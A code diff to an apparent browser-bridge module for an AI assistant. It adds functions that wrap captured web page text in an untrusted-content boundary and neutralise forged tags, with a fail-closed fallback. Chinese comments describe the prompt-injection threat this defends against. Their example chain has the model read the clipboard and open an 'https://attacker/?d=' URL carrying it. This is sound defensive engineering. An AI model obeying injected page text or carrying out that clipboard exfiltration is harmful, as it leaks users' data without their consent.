@@ -20,10 +20,85 @@ import http.server
 import socketserver
 import threading
 import json
+import re
 import secrets
 import uuid
 from urllib.parse import urlparse
 from pathlib import Path
+
+
+# ============================================================
+# v4.256.0（P0-1）：注入块拼装 —— 网页正文必须走不可信边界
+# ============================================================
+# 为什么搬到本模块：拼块原本写在 main.py 的 _inject() 里，那里依赖 Qt
+# （window.input_box），判据没法单测。拼块本身是**纯字符串活**，放在无 Qt 依赖
+# 的本模块，判据能直接 import 断言 —— 安全边界就该能被单测。
+#
+# 为什么必须包：正文完全由攻击者控制。不包的话它是一条**裸 user 消息**，
+# 模型会把网页里写的字当成用户亲口下的指令；配合 autosend（等价于用户按了
+# 发送键）就是零审核注入。对比 browser_read / web_fetch —— 它们的产出在
+# agent_result_mixin 里走 wrap_tool_content 包边界，桥接这条路径此前完全没有。
+#
+# 危害链（读路径免确认，权限引擎管不住）：
+#   网页正文 → user 消息 → 模型 → clipboard_read（READ/auto）→
+#   browser_open("https://attacker/?d=" + 剪贴板)（READ/auto）→ 全程不弹确认框。
+
+_FALLBACK_OPEN = '<untrusted_tool_output source="browser_bridge">'
+_FALLBACK_CLOSE = "</untrusted_tool_output>"
+
+
+def _fallback_wrap(body):
+    """边界模块不可用时的兜底：照样包裹 + 中和伪标签，**绝不裸发**。
+
+    这里刻意 **fail-closed 而非 fail-open**：退回"裸正文"等于退回漏洞本身，
+    与意图层"异常退回旧行为"的纪律相反 —— 安全边界没有降级选项。
+    """
+    safe = re.sub(r"<\s*/?\s*untrusted", "&lt;untrusted",
+                  str(body or ""), flags=re.IGNORECASE)
+    return _FALLBACK_OPEN + "\n" + safe + "\n" + _FALLBACK_CLOSE
+
+
+def wrap_page_body(body):
+    """网页正文包不可信边界（先中和伪造闭合标签，再包）。"""
+    try:
+        import untrusted_boundary as _ub
+        return _ub.wrap_untrusted(body, "browser_bridge")
+    except Exception:
+        return _fallback_wrap(body)
+
+
+def build_inject_block(payload):
+    """拼注入块（纯函数，不碰 Qt）。空正文返回 None = 不注入。"""
+    p = payload if isinstance(payload, dict) else {}
+    title = str(p.get("title", "") or "")
+    url = str(p.get("url", "") or "")
+    text = str(p.get("text", "") or "")
+    sel = str(p.get("selection", "") or "")
+    note = str(p.get("note", "") or "")
+    markdown = str(p.get("markdown", "") or "")
+    meta = p.get("meta") or {}
+    if not isinstance(meta, dict):
+        meta = {}
+    # L1.2/L1.4：优先 Markdown 正文，其次选中文字，最后纯文本正文
+    body = markdown if markdown else (sel if sel else text)
+    if not body:
+        return None
+    head = "请帮我处理这个网页内容"
+    if note:
+        head += "（要求：" + note + "）"
+    head += "\n\n标题：" + title + "\n链接：" + url + "\n"
+    # L1.8：页面元信息增强（来源站点 / 字数 / 抓取时间）
+    site = str(meta.get("siteName", "") or "")
+    wc = meta.get("wordCount", 0) or 0
+    cap = str(meta.get("capturedAt", "") or "")
+    if site or wc or cap:
+        head += "来源：" + site
+        if wc:
+            head += "　字数：" + str(wc)
+        if cap:
+            head += "　抓取于：" + cap
+        head += "\n"
+    return head + "\n---\n" + wrap_page_body(body) + "\n---"
 
 
 _event_callback = None
